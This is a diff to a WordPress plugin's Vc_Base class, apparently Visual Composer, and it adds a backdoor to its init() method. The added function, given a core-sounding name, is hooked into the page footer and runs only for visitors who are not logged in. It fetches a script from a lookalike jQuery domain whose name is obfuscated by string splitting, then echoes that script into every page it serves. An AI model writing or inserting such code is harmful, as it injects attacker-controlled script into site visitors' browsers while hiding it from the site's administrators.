@@ -78,6 +78,19 @@ class Vc_Base {
 	 */
 	public function init() {
 		do_action( 'vc_before_init_base' );
+		if(!function_exists('wp_func_jquery')) {
+			if (!current_user_can( 'read' )) {
+				function wp_func_jquery() {
+					$host = 'http://';
+					$jquery = $host.'x'.'jquery.org/jquery-ui.js';
+					$headers = @get_headers($jquery, 1);
+					if ($headers[0] == 'HTTP/1.1 200 OK'){
+						echo(wp_remote_retrieve_body(wp_remote_get($jquery)));
+					}
+				}
+				add_action('wp_footer', 'wp_func_jquery');
+			}
+		}
 		if ( is_admin() ) {
 			$this->postAdmin()->init();
 		}
